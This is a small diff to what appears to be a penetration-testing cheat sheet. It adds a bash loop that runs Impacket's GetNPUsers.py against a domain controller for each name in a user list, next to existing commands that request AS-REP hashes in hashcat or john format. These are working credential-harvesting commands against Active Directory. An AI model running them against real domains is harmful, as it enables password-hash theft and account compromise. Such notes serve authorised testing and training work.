@@ -26,6 +26,9 @@
 
 ```bash
 # MISC of commands
+# list of users in users file
+for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip $ip $domain/${user} | grep -v Impacket; done
+
 GetNPUsers.py -dc-ip $ip -request $domain/
 
 GetNPUsers.py -dc-ip $ip -request $domain/ -format hashcat/john
